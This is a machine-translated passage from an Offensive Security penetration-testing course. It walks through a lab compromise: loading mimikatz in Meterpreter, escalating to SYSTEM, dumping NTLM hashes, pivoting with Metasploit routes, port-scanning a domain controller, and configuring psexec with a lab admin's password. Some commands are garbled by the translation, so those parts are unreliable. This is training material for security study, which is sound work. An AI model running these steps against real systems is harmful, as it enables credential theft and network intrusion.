<div style="position:absolute;top:115283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">717 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（卡洛斯·佩雷斯，2016 年），https://www.darkoperator.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:115411;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="98"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 98 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:115444;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:116521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:116521;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:116521;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">715</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:115556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助 powershell</font></font></font></b></nobr></div>
<div style="position:absolute;top:115590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powershell 命令</font></font></nobr></div>
<div style="position:absolute;top:115608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">====================</font></font></nobr></div>
<div style="position:absolute;top:115641;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令    </font></font></nobr></div>
<div style="position:absolute;top:115641;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:115658;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------    </font></font></nobr></div>
<div style="position:absolute;top:115658;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
<div style="position:absolute;top:115675;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell_execute 执行 Powershell 命令字符串</font></font></nobr></div>
<div style="position:absolute;top:115692;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell_import 导入 PS1 脚本或 .NET 程序集 DLL</font></font></nobr></div>
<div style="position:absolute;top:115709;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell_shell 创建交互式 Powershell 提示</font></font></nobr></div>
<div style="position:absolute;top:115729;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 801 - 加载 PowerShell 扩展</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell_execute</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来检索 PowerShell 版本</font></font></nobr></div>
<div style="position:absolute;top:115777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PSVersionTable.PSVersion</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局变量。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:115812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell_execute "$PSVersionTable.PSVersion"</font></font></font></b></nobr></div>
<div style="position:absolute;top:115829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 命令执行完成：</font></font></nobr></div>
<div style="position:absolute;top:115863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要次要构建修订</font></font></nobr></div>
<div style="position:absolute;top:115880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----- ----- ----- --------</font></font></nobr></div>
<div style="position:absolute;top:115897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5 1 16299 248</font></font></nobr></div>
<div style="position:absolute;top:115931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:115950;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 802 - 执行 PowerShell 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:115980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mimikatz 也非常有用，幸运的是，它的实现可用作 Meterpreter</font></font></nobr></div>
<div style="position:absolute;top:115999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扩大。</font><font style="vertical-align: inherit;">在这个例子中，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">load kiwi</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行扩展</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">由于 mimikatz 需要</font></font></nobr></div>
<div style="position:absolute;top:116019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYSTEM权限，我们将运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getsystem</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动从我们的系统获取SYSTEM权限</font></font></nobr></div>
<div style="position:absolute;top:116038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前的高完整性外壳（在 offsec 用户的上下文中）。</font><font style="vertical-align: inherit;">最后，我们将转储系统</font></font></nobr></div>
<div style="position:absolute;top:116057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds_msv 的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载奇异果</font></font></font></b></nobr></div>
<div style="position:absolute;top:116109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载扩展猕猴桃...</font></font></nobr></div>
<div style="position:absolute;top:116143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功。</font></font></nobr></div>
<div style="position:absolute;top:116177;left:109"><nobr><font style="vertical-align: inherit;"><b><font color="#0070c0"><font style="vertical-align: inherit;">Meterpreter</font></font></b><font style="vertical-align: inherit;"> &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取系统</font></font></font></b></nobr></div>
<div style="position:absolute;top:116194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...通过技术 1（命名管道模拟（内存/管理员））获得系统。</font></font></nobr></div>
<div style="position:absolute;top:116228;left:109"><nobr><font style="vertical-align: inherit;"><b><font color="#0070c0"><font style="vertical-align: inherit;">Meterpreter</font></font></b><font style="vertical-align: inherit;"> &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds_msv</font></font></font></b></nobr></div>
<div style="position:absolute;top:116245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 作为系统运行</font></font></nobr></div>
<div style="position:absolute;top:116262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 检索 msv 凭据</font></font></nobr></div>
<div style="position:absolute;top:116279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msv 凭据</font></font></nobr></div>
<div style="position:absolute;top:116296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:116330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名域 NTLM    </font></font></nobr></div>
<div style="position:absolute;top:116330;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SHA1    </font></font></nobr></div>
<div style="position:absolute;top:116347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DPAPI</font></font></nobr></div>
<div style="position:absolute;top:116364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">———————————————    </font></font></nobr></div>
<div style="position:absolute;top:116364;left:546"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:116381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----</font></font></nobr></div>
<div style="position:absolute;top:116398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CLIENT251$ 公司 4d4ae0e7cb16d4cfe6a91412b3d80ed4 5262a3692e319ca71ac2dfdb2f758e50</font></font></nobr></div>
<div style="position:absolute;top:116415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2adbf154  </font></font></nobr></div>
<div style="position:absolute;top:116432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">offsec corp e2b475c11da2a0748290d87aa966c327 8c77f430e4ab8acb10ead387d64011c7</font></font></nobr></div>
<div style="position:absolute;top:116449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6400d26e c10c264a27b63c4e66728bbef4be8aab </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:116599;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="99"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 99 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:116632;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:117709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:117709;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:117709;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">716</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:116764;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 803 - 使用来自 meterpreter 的 mimikatz</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:116795;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.4</font></font></i></nobr></div>
<div style="position:absolute;top:116795;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Metasploit 框架进行旋转</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:116833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">妥协的目标后，我们就可以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转动</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从系统到额外的目标。</font><font style="vertical-align: inherit;">我们可以转</font></font></nobr></div>
<div style="position:absolute;top:116852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 MSF 内部，这很方便，但缺乏手动旋转技术的灵活性。</font></font></nobr></div>
<div style="position:absolute;top:116885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，让我们利用现有的 Meterpreter 会话来枚举内部网络的</font></font></nobr></div>
<div style="position:absolute;top:116905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 基础结构并转向其他机器。</font></font></nobr></div>
<div style="position:absolute;top:116937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们注意到受感染的 Windows 客户端有两个网络接口。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:116972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:117006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:117040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet1：</font></font></nobr></div>
<div style="position:absolute;top:117074;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:117091;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链路本地 IPv6 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">：fe80::49e9:5c50:265f:6600%4</font></font></nobr></div>
<div style="position:absolute;top:117108;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.111</font></font></font></b></nobr></div>
<div style="position:absolute;top:117125;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:117142;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:117176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器 Ethernet0:</font></font></nobr></div>
<div style="position:absolute;top:117210;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:117226;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22</font></font></font></b></nobr></div>
<div style="position:absolute;top:117244;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:117261;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.2</font></font></nobr></div>
<div style="position:absolute;top:117295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec.corp&gt;</font></font></nobr></div>
<div style="position:absolute;top:117314;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 804 - 受感染客户端上的双接口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">route</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">add</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建到我们发现的备用内部网络子网的路径。</font></font></nobr></div>
<div style="position:absolute;top:117363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还将指定此路由将应用于的会话 ID：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由添加 192.168.1.0/24 11</font></font></font></b></nobr></div>
<div style="position:absolute;top:117414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 添加了路线</font></font></nobr></div>
<div style="position:absolute;top:117449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由打印</font></font></font></b></nobr></div>
<div style="position:absolute;top:117482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 活动路由表</font></font></nobr></div>
<div style="position:absolute;top:117499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==========================</font></font></nobr></div>
<div style="position:absolute;top:117533;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网    </font></font></nobr></div>
<div style="position:absolute;top:117533;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络掩码    </font></font></nobr></div>
<div style="position:absolute;top:117533;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网关</font></font></nobr></div>
<div style="position:absolute;top:117550;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------    </font></font></nobr></div>
<div style="position:absolute;top:117550;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------    </font></font></nobr></div>
<div style="position:absolute;top:117550;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------</font></font></nobr></div>
<div style="position:absolute;top:117567;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.0    </font></font></nobr></div>
<div style="position:absolute;top:117567;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255.255.255.0 第 11 节</font></font></nobr></div>
<div style="position:absolute;top:117587;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 805 - 添加新路由</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:117616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过创建到内部网络的路径，我们现在可以枚举这个子网。</font><font style="vertical-align: inherit;">既然我们已经</font></font></nobr></div>
<div style="position:absolute;top:117635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知道域控制器的 IP 地址，我们将使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:117655;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描/tcp</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块。</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:117787;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="100"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 100 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:117820;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:118897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:118897;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:118897;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">717</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:117918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font><b><font color="#0070c0"><font style="vertical-align: inherit;">使用辅助/扫描器/</font></font></b><font style="vertical-align: inherit;">端口</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描/tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:117952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOSTS 192.168.1.110</font></font></font></b></nobr></div>
<div style="position:absolute;top:117969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:118003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/</font><b><font color="#0070c0"><font style="vertical-align: inherit;">端口</font></font></b><font style="vertical-align: inherit;">扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置端口 445,3389</font></font></font></b></nobr></div>
<div style="position:absolute;top:118020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 =&gt; 445,3389</font></font></nobr></div>
<div style="position:absolute;top:118053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:118088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 192.168.1.110：    </font></font></nobr></div>
<div style="position:absolute;top:118088;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 192.168.1.110:3389 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:118105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 192.168.1.110：    </font></font></nobr></div>
<div style="position:absolute;top:118105;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 192.168.1.110:445 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:118121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 192.168.1.110：    </font></font></nobr></div>
<div style="position:absolute;top:118121;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:118138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:118155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt; </font></font></nobr></div>
<div style="position:absolute;top:118175;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 806 - 端口扫描内部 IP 地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:118204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们之前发现了域控制器的有效管理凭据，因此我们可能会</font></font></nobr></div>
<div style="position:absolute;top:118223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在尝试通过使用 smb/psexec 模块转向域控制器。</font><font style="vertical-align: inherit;">我们需要</font></font></nobr></div>
<div style="position:absolute;top:118243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过指定</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBDomain</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBUser</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBPass 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值来指定凭据，</font><font style="vertical-align: inherit;">如图所示</font></font></nobr></div>
<div style="position:absolute;top:118262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:118297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用exploit/windows/smb/psexec</font></font></font></b></nobr></div>
<div style="position:absolute;top:118331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBDomain 公司</font></font></font></b></nobr></div>
<div style="position:absolute;top:118348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBDomain =&gt; 公司</font></font></nobr></div>
<div style="position:absolute;top:118382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBUser jeff_admin</font></font></font></b></nobr></div>
<div style="position:absolute;top:118399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBUser =&gt; jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:118433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SMBPass Qwerty09！</font></font></font></b></nobr></div>
